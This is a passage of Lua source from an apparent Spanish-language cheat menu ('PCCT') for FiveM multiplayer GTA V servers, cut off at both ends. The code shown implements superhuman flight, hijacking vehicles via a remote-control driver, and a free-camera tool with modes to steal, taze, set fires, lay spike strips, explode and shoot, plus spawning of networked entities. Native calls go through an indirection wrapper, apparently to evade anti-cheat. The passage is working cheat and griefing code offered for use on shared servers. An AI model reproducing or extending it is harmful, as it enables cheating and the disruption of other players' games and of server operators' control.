                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing then

                        magic_carpet_obj = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, true, true, true)

                        PCCT:DoNetwork(magic_carpet_obj)

                        local rot = PCCT:GetFunction("GetEntityRotation")(preview_magic_carpet)

                        PCCT:GetFunction("SetEntityRotation")(magic_carpet_obj, rot)

                        PCCT.Util:DeleteEntity(preview_magic_carpet)

                        _no_combat = false

                    end

                else

                    PCCT:GetFunction("FreezeEntityPosition")(magic_carpet_obj, true)

                    _do_flying()

                    local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer, 0.0, 0.0, 0.0)

                    local carpet = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, picho.vector_origin)

                    local dist = PCCT:GetFunction("GetDistanceBetweenCoords")(coords.x, coords.y, coords.z, carpet.x, carpet.y, carpet.z)



                    if dist <= 5.0 then

                        PCCT:Draw3DText(carpet.x, carpet.y, carpet.z, "Presiona [E] para montarte " .. (magic_riding and "off" or "on") .. ".", PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3])



                        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["E"]) then

                            magic_riding = not magic_riding

                            _do_riding()

                        end

                    end

                end

            else

                if preview_magic_carpet and PCCT:GetFunction("DoesEntityExist")(preview_magic_carpet) then

                    PCCT.Util:DeleteEntity(preview_magic_carpet)

                    _no_combat = false

                end



                if magic_carpet_obj and PCCT:GetFunction("DoesEntityExist")(magic_carpet_obj) then

                    PCCT.Util:DeleteEntity(magic_carpet_obj)

                    PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                    _no_combat = false

                end

            end

        end

    end)



    CreateThread(function()

        while PCCT.Enabled do

            if PCCT.Config.Player.SuperMan then

                PCCT:GetFunction("GivePlayerRagdollControl")(PCCT.NetworkID, true)

                PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, false)

                PCCT:GetFunction("GiveDelayedWeaponToPed")(PCCT.LocalPlayer, 0xFBAB5776, 1, 0)

                local up, forward = PCCT:GetFunction("IsControlPressed")(0, PCCT.Keys["SPACE"]), PCCT:GetFunction("IsControlPressed")(0, PCCT.Keys["W"])



                if up or forward then

                    if up then

                        PCCT:GetFunction("ApplyForceToEntity")(PCCT.LocalPlayer, 1, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)

                    elseif PCCT:GetFunction("IsEntityInAir")(PCCT.LocalPlayer) then

                        PCCT:GetFunction("ApplyForceToEntity")(PCCT.LocalPlayer, 1, 0.0, 9999999.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)

                    end



                    Wait(0)

                end

            else

                PCCT:GetFunction("GivePlayerRagdollControl")(PCCT.NetworkID, false)

                PCCT:GetFunction("SetPedCanRagdoll")(PCCT.LocalPlayer, true)

            end



            Wait(0)

        end

    end)



    PCCT.RCCar = {

        Cam = nil,

        On = false,

        Driver = nil,

        Vehicle = nil,

        CamOn = false,

        Keys = {

            NUMPAD_UP = 111,

            NUMPAD_DOWN = 112,

            NUMPAD_LEFT = 108,

            NUMPAD_RIGHT = 109,

            UP = 188,

            DOWN = 173,

            LEFT = 174,

            RIGHT = 175

        }

    }



    local _rc_on



    function PCCT.RCCar:MoveCar()

        PCCT:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.Driver, true)

        PCCT:GetFunction("NetworkRequestControlOfEntity")(self.Vehicle)

        PCCT:GetFunction("SetVehicleEngineOn")(self.Vehicle, true)

        PCCT:GetFunction("SetPedAlertness")(self.Driver, 0.0)



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 9, 1)

        end



        if (PCCT:GetFunction("IsControlReleased")(0, self.Keys.NUMPAD_UP) and PCCT:GetFunction("IsControlReleased")(0, self.Keys.UP)) or (PCCT:GetFunction("IsControlJustReleased")(0, self.Keys.NUMPAD_DOWN) or PCCT:GetFunction("IsControlJustReleased")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 6, 2500)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 22, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 13, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 14, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 30, 100)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 7, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 8, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 4, 1)

        end



        if (PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or PCCT:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not PCCT:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not PCCT:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then

            PCCT:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 5, 1)

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELUP"]) then

            rc_camSX = rc_camSX - 1

            rc_camSY = rc_camSY - 0.05

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELDOWN"]) then

            rc_camSX = rc_camSX + 1.1

            rc_camSY = rc_camSY + 0.055

        end

    end



    local rc_camRP, rc_camRY, rc_camRR

    local p, y, r



    local function approach(from, to, inc)

        if from >= to then return from end



        return from + inc

    end



    function PCCT.RCCar:GetCamRot(gameplay_rot)

        local car_rot = PCCT:GetFunction("GetEntityRotation")(self.Vehicle)



        if not p and not y and not r then

            p, y, r = car_rot.x, car_rot.y, car_rot.z

        end



        p = approach(p, car_rot.x, 0.5)

        y = approach(y, car_rot.y, 0.5)

        r = approach(r, car_rot.z, 0.5)



        return car_rot.x, car_rot.y, car_rot.z

    end



    local insults, voices = {"GENERIC_INSULT_HIGH", "GENERIC_INSULT_MED", "GENERIC_SHOCKED_HIGH", "FIGHT_RUN", "CRASH_CAR", "KIFFLOM_GREET", "PHONE_SURPRISE_EXPLOSION"}, {"S_M_Y_SHERIFF_01_WHITE_FULL_01", "A_F_M_SOUCENT_02_BLACK_FULL_01", "A_F_M_BODYBUILD_01_WHITE_FULL_01", "A_F_M_BEVHILLS_02_BLACK_FULL_01"}



    function PCCT.RCCar:Tick()

        if not PCCT:GetFunction("DoesCamExist")(self.Cam) then

            self.Cam = PCCT:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)

            PCCT:GetFunction("SetCamShakeAmplitude")(self.Cam, 0.0)

        end



        while PCCT.Enabled do

            Wait(0)



            if self.On then

                local rot_vec = PCCT:GetFunction("GetGameplayCamRot")(0)



                if not PCCT:GetFunction("DoesEntityExist")(self.Vehicle) then

                    PCCT:GetFunction("ClearPedTasksImmediately")(self.Driver)

                    PCCT.Util:DeleteEntity(self.Driver)

                    self.CamOn = false

                    self.On = false

                elseif not PCCT:GetFunction("DoesEntityExist")(self.Driver) or PCCT:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1) ~= self.Driver or PCCT:GetFunction("IsEntityDead")(self.Driver) then

                    PCCT:GetFunction("ClearPedTasksImmediately")(PCCT:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1))

                    local model = PCCT.FreeCam.SpawnerOptions.PED[picho.math.random(1, #PCCT.FreeCam.SpawnerOptions.PED)]

                    PCCT:RequestModelSync(model)

                    PCCT.Util:DeleteEntity(self.Driver)

                    self.Driver = PCCT:GetFunction("CreatePedInsideVehicle")(self.Vehicle, 24, PCCT:GetFunction("GetHashKey")(model), -1, true, true)

                end



                if self.On then

                    self:MoveCar()

                    PCCT:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.Vehicle, true)

                    PCCT:GetFunction("SetVehicleDoorsLocked")(self.Vehicle, 2)



                    if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["E"]) then

                        PCCT:GetFunction("PlayAmbientSpeechWithVoice")(self.Driver, insults[picho.math.random(1, #insults)], voices[picho.math.random(1, #voices)], "SPEECH_PARAMS_FORCE_SHOUTED", false)

                    end

                end



                if self.CamOn and not _rc_on then

                    PCCT:GetFunction("SetCamActive")(self.Cam, true)

                    PCCT:GetFunction("SetCamAffectsAiming")(self.Cam, false)

                    PCCT:GetFunction("SetCamActive")(PCCT:GetFunction("GetRenderingCam")(), false)

                    PCCT:GetFunction("RenderScriptCams")(true, false, false, true, true)

                    _rc_on = true

                    local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (PCCT:GetFunction("GetEntityForwardVector")(self.Vehicle) * (PCCT:GetModelLength(self.Vehicle) * -0.85))

                    rc_camX, rc_camY, rc_camZ = coords.x, coords.y, coords.z

                    local rot = PCCT:GetFunction("GetEntityRotation")(self.Vehicle)

                    rc_camRP, rc_camRY, rc_camRR = rot.x, rot.y, rot.z

                elseif not self.CamOn and _rc_on then

                    PCCT:GetFunction("DisableAllControlActions")(0)

                    PCCT:EnableMouse()

                    PCCT:GetFunction("SetCamActive")(self.Cam, false)

                    PCCT:GetFunction("SetCamActive")(PCCT:GetFunction("GetRenderingCam")(), true)

                    PCCT:GetFunction("RenderScriptCams")(false, false, false, false, false)

                    PCCT:GetFunction("SetFocusEntity")(PCCT.LocalPlayer)

                    PCCT.FreeCam:DisableMovement(false)

                    _rc_on = false

                end



                if self.CamOn and _rc_on then

                    PCCT:GetFunction("StopGameplayCamShaking")(true)

                    local ent_pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (PCCT:GetFunction("GetEntityForwardVector")(self.Vehicle) * (PCCT:GetModelLength(self.Vehicle) * -0.85))

                    local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer)

                    PCCT:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)

                    PCCT:DrawIbuttons()

                    PCCT.FreeCam:DisableMovement(true)

                    rc_camX, rc_camY, rc_camZ = ent_pos.x, ent_pos.y, ent_pos.z



                    if rc_camSY then

                        rc_camZ = rc_camZ + rc_camSY

                    end



                    rc_camZ = rc_camZ + (PCCT:GetModelHeight(self.Vehicle) * 1.2)

                    rc_camRP, rc_camRY, rc_camRR = self:GetCamRot(rot_vec)

                    PCCT:GetFunction("SetFocusPosAndVel")(rc_camX, rc_camY, rc_camZ, 0, 0, 0)

                    PCCT:GetFunction("SetCamCoord")(self.Cam, rc_camX, rc_camY, rc_camZ)

                    PCCT:GetFunction("SetCamRot")(self.Cam, rc_camRP + 0.0, rc_camRY + 0.0, rc_camRR + 0.0)

                    PCCT:GetFunction("SetCamFov")(self.Cam, rc_camSX + 0.0)

                end

            end

        end

    end



    PCCT.FreeCam = {

        Cam = nil,

        On = false,

        Modifying = nil,

        Mode = 1,

        Modes = {

            ["LOOK_AROUND"] = 1,

            ["REMOVER"] = 2,

            ["PED_SPAWNER"] = 3,

            ["OBJ_SPAWNER"] = 4,

            ["VEH_SPAWNER"] = 5,

            ["PREMADE_SPAWNER"] = 6,

            ["TELEPORT"] = 7,

            ["RC_CAR"] = 8,

            ["STEAL"] = 9,

            ["TAZE"] = 10,

            ["HYDRANT"] = 11,

            ["FIRE"] = 12,

            ["SPIKE_STRIPS"] = 13,

            ["DISABLE_VEHICLE"] = 14,

            ["EXPLODE"] = 15,

            ["SHOOT_BULLET"] = 16

        },

        ModeNames = {

            [1] = "Ver",

            [2] = "Remover",

            [3] = "Spawnear peds",

            [4] = "Spawnear objetos",

            [5] = "Spawnear vehiculos",

            [6] = "Spawnear Preconstruidos",

            [7] = "TP",

            [8] = "Carro RC",

            [9] = "Robar",

            [10] = "Tazear",

            [11] = "Hydrante",

            [12] = "Fuego",

            [13] = "Poner Pinchos",

            [14] = "Desabilitar vehiculos",

            [15] = "Explotar",

            [16] = "Disparar balas"

        }

    }



    function PCCT.FreeCam:Switcher()

        if not self.On then return end

        local cur = self.Mode

        local new = cur

        if self.DraggingEntity and PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) then return end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELDOWN"]) then

            new = cur - 1



            if not self.ModeNames[new] then

                new = #self.ModeNames

            end



            self.Mode = new

        end



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELUP"]) then

            new = cur + 1



            if not self.ModeNames[new] then

                new = 1

            end



            self.Mode = new

        end

    end



    function PCCT.FreeCam:Toggle(mode)

        self.On = not self.On

        self.Mode = mode

    end



    function PCCT.FreeCam:GetModelSize(hash)

        return PCCT:GetFunction("GetModelDimensions")(hash)

    end



    function PCCT.FreeCam:DrawBoundingBox(entity, r, g, b, a)

        if entity then

            r = r or 255

            g = g or 0

            b = b or 0

            a = a or 40

            local model = PCCT:GetFunction("GetEntityModel")(entity)

            local min, max = PCCT:GetFunction("GetModelDimensions")(model)

            local top_front_right = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, max)

            local top_back_right = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, max.z))

            local bottom_front_right = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, max.y, min.z))

            local bottom_back_right = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, min.z))

            local top_front_left = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, max.z))

            local top_back_left = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, min.y, max.z))

            local bottom_front_left = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, min.z))

            local bottom_back_left = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, min)

            -- LINES

            -- RIGHT SIDE

            PCCT:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)

            PCCT:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)

            PCCT:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)

            PCCT:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)

            -- LEFT SIDE

            PCCT:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)

            PCCT:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)

            PCCT:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)

            PCCT:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)

            -- Connection

            PCCT:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)

            PCCT:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)

            PCCT:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)

            PCCT:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)

            -- POLYGONS

            -- FRONT

            PCCT:GetFunction("DrawPoly")(top_front_left, top_front_right, bottom_front_right, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)

            -- TOP

            PCCT:GetFunction("DrawPoly")(top_front_right, top_front_left, top_back_right, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(top_front_left, top_back_left, top_back_right, r, g, b, a)

            -- BACK

            PCCT:GetFunction("DrawPoly")(top_back_right, top_back_left, bottom_back_right, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)

            -- LEFT

            PCCT:GetFunction("DrawPoly")(top_back_left, top_front_left, bottom_front_left, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)

            -- RIGHT

            PCCT:GetFunction("DrawPoly")(top_front_right, top_back_right, bottom_front_right, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)

            -- BOTTOM

            PCCT:GetFunction("DrawPoly")(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)

            PCCT:GetFunction("DrawPoly")(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)



            return true

        end



        return false

    end



    function PCCT.FreeCam:Crosshair(on)

        if on then

            PCCT:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3], 255)

            PCCT:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3], 255)

        else

            PCCT:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, 100, 100, 100, 255)

            PCCT:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, 100, 100, 100, 255)

        end

    end



    function PCCT:Draw3DText(x, y, z, text, r, g, b)

        self:GetFunction("SetDrawOrigin")(x, y, z, 0)

        self:GetFunction("SetTextFont")(0)

        self:GetFunction("SetTextProportional")(0)

        self:GetFunction("SetTextScale")(0.0, 0.17)

        self:GetFunction("SetTextColour")(r, g, b, 255)

        self:GetFunction("SetTextOutline")()

        self:GetFunction("BeginTextCommandDisplayText")("STRING")

        self:GetFunction("SetTextCentre")(1)

        self:GetFunction("AddTextComponentSubstringPlayerName")(text)

        self:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)

        self:GetFunction("ClearDrawOrigin")()

    end



    function PCCT:DrawScaled3DText(x, y, z, textInput, fontId, scaleX, scaleY)

        local coord = self:GetFunction("GetFinalRenderedCamCoord")()

        local px, py, pz = coord.x, coord.y, coord.z

        local dist = self:GetFunction("GetDistanceBetweenCoords")(px, py, pz, x, y, z)

        local scale = (1 / dist) * 20

        local fov = (1 / self:GetFunction("GetGameplayCamFov")()) * 100

        local scale = scale * fov

        self:GetFunction("SetTextScale")(scaleX * scale, scaleY * scale)

        self:GetFunction("SetTextFont")(fontId)

        self:GetFunction("SetTextProportional")(1)

        self:GetFunction("SetTextColour")(250, 250, 250, 255) -- You can change the text color here

        self:GetFunction("SetTextDropShadow")(1, 1, 1, 1, 255)

        self:GetFunction("SetTextEdge")(2, 0, 0, 0, 150)

        self:GetFunction("SetTextDropShadow")()

        self:GetFunction("SetTextOutline")()

        self:GetFunction("BeginTextCommandDisplayText")("STRING")

        self:GetFunction("SetTextCentre")(1)

        self:GetFunction("AddTextComponentSubstringPlayerName")(textInput)

        self:GetFunction("SetDrawOrigin")(x, y, z + 2, 0)

        self:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)

        self:GetFunction("ClearDrawOrigin")()

    end



    function PCCT.FreeCam:DrawInfoCard(entity)

        if not PCCT:GetFunction("DoesEntityExist")(entity) then return end

        local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.0, 0.0, 0.0)

        local angle = PCCT:GetFunction("GetEntityRotation")(entity)



        if picho.frozen_ents[entity] == nil then

            picho.frozen_ents[entity] = false

        end



        local str = {[[ Model: ]] .. PCCT:GetFunction("GetEntityModel")(entity), [[ Pos: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z), [[ Rot: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(angle.x, angle.y, angle.z), [[ Frozen: ]] .. picho.tostring(picho.frozen_ents[entity])}

        local y = coords.z



        for _, val in picho.pairs(str) do

            PCCT:DrawScaled3DText(coords.x, coords.y, y, val, 4, 0.1, 0.1)

            y = y - 0.35

        end

    end



    function PCCT.FreeCam:CheckType(entity, type)

        if type == "ALL" then return PCCT:GetFunction("IsEntityAnObject")(entity) or PCCT:GetFunction("IsEntityAVehicle")(entity) or PCCT:GetFunction("IsEntityAPed")(entity) end

        if type == "VEHICLE" then return PCCT:GetFunction("IsEntityAVehicle")(entity) end

        if type == "PED" then return PCCT:GetFunction("IsEntityAPed")(entity) end



        return true

    end



    function PCCT.FreeCam:GetType(entity)

        if PCCT:GetFunction("IsEntityAnObject")(entity) then return "OBJECT" end

        if PCCT:GetFunction("IsEntityAVehicle")(entity) then return "VEHICLE" end

        if PCCT:GetFunction("IsEntityAPed")(entity) then return "PED" end

    end



    function PCCT.FreeCam:Clone(entity)

        local type = self:GetType(entity)

        if not type then return end

        local where = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.1, 0.1, 0.1)

        local rot = PCCT:GetFunction("GetEntityRotation")(entity)



        if type == "OBJECT" then

            local clone = PCCT:GetFunction("CreateObject")(PCCT:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, true, true, true)

            PCCT:DoNetwork(clone)

            PCCT:GetFunction("SetEntityRotation")(clone, rot)

            picho.frozen_ents[clone] = picho.frozen_ents[entity]

            self.DraggingEntity = clone

            PCCT:AddNotification("INFO", "Cloned object " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, entity))

            Wait(50)

        elseif type == "VEHICLE" then

            local clone = PCCT:GetFunction("CreateVehicle")(PCCT:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, PCCT:GetFunction("GetEntityHeading")(entity), true, true)

            PCCT:GetFunction("SetEntityRotation")(clone, rot)

            picho.frozen_ents[clone] = picho.frozen_ents[entity]

            self.DraggingEntity = clone

            PCCT:AddNotification("INFO", "Cloned vehicle " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, entity))

        elseif type == "PED" then

            local clone = PCCT:GetFunction("CreatePed")(4, PCCT:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, PCCT:GetFunction("GetEntityHeading")(entity), true, true)

            PCCT:GetFunction("SetEntityRotation")(clone, rot)

            picho.frozen_ents[clone] = picho.frozen_ents[entity]

            self.DraggingEntity = clone

            PCCT:AddNotification("INFO", "Cloned ped " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, entity))

        end

    end



    function PCCT.FreeCam:Remover(entity, type)

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Delete"}, {"b_117", "Change Mode"}})



        if PCCT:GetFunction("DoesEntityExist")(entity) and PCCT:GetFunction("DoesEntityHaveDrawable")(entity) and self:CheckType(entity, type) then

            self:DrawBoundingBox(entity, 255, 50, 50, 50)



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing then

                if entity == PCCT.LocalPlayer then return PCCT:AddNotification("ERROR", "You can not delete yourself!", 10000) end

                if _is_ped_player(entity) then return PCCT:AddNotification("ERROR", "You can not delete players!", 10000) end

                self:DrawBoundingBox(entity, 255, 50, 50, 50)

                PCCT:AddNotification("INFO", "Borrado " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(entity)), 10000)

                PCCT.Util:DeleteEntity(entity)



                return

            end

        end

    end



    function PCCT.FreeCam:Attack(attacker, victim)

        PCCT:GetFunction("ClearPedTasks")(attacker)



        if PCCT:GetFunction("IsEntityAPed")(victim) then

            PCCT:GetFunction("TaskCombatPed")(attacker, victim, 0, 16)

            PCCT:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(attacker)) .. " attacking " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(victim)), 5000)

        elseif PCCT:GetFunction("IsEntityAVehicle")(victim) then

            CreateThread(function()

                PCCT:StealVehicleThread(attacker, victim)

            end)



            PCCT:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(attacker)) .. " stealing " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(victim)), 5000)

        end

    end



    local beginning_target



    function PCCT.FreeCam:PedTarget(cam, x, y, z)

        local rightVec, forwardVec, upVec = PCCT:GetFunction("GetCamMatrix")(cam)

        local curVec = vector3(x, y, z)

        local targetVec = curVec + forwardVec * 150

        local handle = PCCT:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)

        local _, _, endCoords, _, entity = PCCT:GetFunction("GetShapeTestResult")(handle)



        if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE2"]) then

            beginning_target = nil

        end



        if not PCCT:GetFunction("DoesEntityExist")(beginning_target) then

            beginning_target = nil

        else

            self:DrawBoundingBox(beginning_target, 0, 100, 0, 50)



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["R"]) then

                PCCT:GetFunction("ClearPedTasks")(beginning_target)

                PCCT:GetFunction("ClearPedSecondaryTask")(beginning_target)

                PCCT:AddNotification("EXITO", "Limpio tareas para " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, beginning_target))

                beginning_target = nil

            end

        end



        if PCCT:GetFunction("DoesEntityExist")(entity) and PCCT:GetFunction("DoesEntityHaveDrawable")(entity) and not PCCT:GetFunction("IsEntityAnObject")(entity) then

            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not beginning_target then

                if PCCT:GetFunction("IsEntityAVehicle")(entity) then

                    entity = PCCT:GetFunction("GetPedInVehicleSeat")(entity, -1)

                end



                beginning_target = entity

            end



            if beginning_target ~= entity then

                self:DrawBoundingBox(entity, 0, 122, 200, 50)



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and PCCT:GetFunction("DoesEntityExist")(beginning_target) then

                    self:Attack(beginning_target, entity)

                    beginning_target = nil

                end

            end

        end

    end



    local selected_spawner_opt = 1

    local selected_weapon_opt = 1

    local asking_weapon

    local selected_ped

    local selected_weapon



    PCCT.FreeCam.SpawnerOptions = {

        ["PED"] = {"s_f_y_bartender_01", "a_m_y_beachvesp_01", "a_m_y_beach_03", "a_m_y_beach_02", "a_m_m_beach_02", "a_m_y_beach_01", "s_m_y_baywatch_01", "mp_f_boatstaff_01", "u_m_m_bikehire_01", "a_f_y_bevhills_04", "s_m_m_bouncer_01", "s_m_y_armymech_01", "s_m_y_autopsy_01", "s_m_y_blackops_01", "s_m_y_blackops_02"},

        ["WEAPONS"] = all_weapons,

